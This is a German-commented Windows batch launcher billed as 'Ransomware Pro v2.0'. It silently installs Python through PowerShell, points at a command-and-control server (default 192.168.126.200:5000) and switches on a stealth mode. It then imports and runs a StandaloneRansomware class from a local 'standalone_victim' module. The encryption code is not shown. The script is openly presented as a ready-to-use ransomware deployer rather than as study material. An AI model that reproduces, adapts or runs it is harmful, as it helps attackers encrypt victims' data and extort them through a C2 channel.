@echo off
REM ========================================
REM RANSOMWARE PRO - AUTOINSTALL LAUNCHER
REM ========================================
REM Installiert Python + Dependencies + startet Ransomware
REM Alles automatisch, keine manuelle Intervention nötig

setlocal enabledelayedexpansion

echo.
echo ╔════════════════════════════════════════════════════════════╗
echo ║  RANSOMWARE PRO v2.0 - AUTO INSTALLER                      ║
echo ║  Installing Python + Dependencies + Launching...           ║
echo ╚════════════════════════════════════════════════════════════╝
echo.

REM ========================================
REM CHECK PYTHON
REM ========================================

echo [*] Checking Python installation...
python --version >nul 2>&1

if %errorlevel% neq 0 (
    echo [-] Python not found! Installing...
    
    REM Download Python installer
    echo [*] Downloading Python 3.11...
    powershell -Command "& {
        $url = 'https://www.python.org/ftp/python/3.11.0/python-3.11.0-amd64.exe'
        $output = 'python-installer.exe'
        (New-Object System.Net.WebClient).DownloadFile($url, $output)
    }" 2>nul
    
    if exist python-installer.exe (
        echo [*] Installing Python...
        python-installer.exe /quiet InstallAllUsers=1 PrependPath=1
        del python-installer.exe
        echo [+] Python installed!
    ) else (
        echo [!] Could not download Python
        echo [*] Please install Python 3.8+ manually from python.org
        pause
        exit /b 1
    )
) else (
    for /f "tokens=*" %%i in ('python --version') do set PYTHON_VER=%%i
    echo [+] Found: !PYTHON_VER!
)

REM ========================================
REM GET C2 SERVER
REM ========================================

set C2_HOST=%1
if "!C2_HOST!"=="" (
    set C2_HOST=192.168.126.200
)

echo [*] C2 Server: !C2_HOST!:5000

REM ========================================
REM INSTALL DEPENDENCIES (STANDALONE)
REM ========================================

echo [*] Setting up environment...

REM Only needed for full version (not for standalone)
REM python -m pip install -q cryptography requests 2>nul

REM ========================================
REM RUN RANSOMWARE
REM ========================================

echo [+] Starting Ransomware...
echo.

setlocal
set PYTHONUNBUFFERED=1
set C2_HOST=!C2_HOST!
set C2_PORT=5000

REM Run the standalone victim (no dependencies needed!)
python -c "
import os
os.environ['C2_HOST'] = '!C2_HOST!'
os.environ['C2_PORT'] = '5000'
os.environ['STEALTH_MODE'] = 'true'

try:
    import sys
    sys.path.insert(0, '.')
    from standalone_victim import StandaloneRansomware
    
    ransomware = StandaloneRansomware()
    ransomware.run()
except Exception as e:
    print(f'[!] Error: {e}')
    import traceback
    traceback.print_exc()
    input('Press Enter to exit...')
    sys.exit(1)
"

endlocal
pause
exit /b 0
